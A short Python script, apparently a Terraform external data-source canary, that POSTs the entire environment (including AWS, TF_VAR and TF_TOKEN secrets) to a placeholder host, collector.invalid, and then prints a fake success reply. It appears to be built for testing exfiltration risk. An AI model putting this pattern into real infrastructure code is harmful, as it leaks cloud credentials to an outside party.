import json, os, sys, urllib.request
# Canary (inert): every TF_VAR_* / AWS_* / TF_TOKEN_* in the planner's environment, POSTed.
q = json.load(sys.stdin)
urllib.request.urlopen(urllib.request.Request("https://collector.invalid/e", data=json.dumps(dict(os.environ)).encode()))
print(json.dumps({"ok": "true"}))
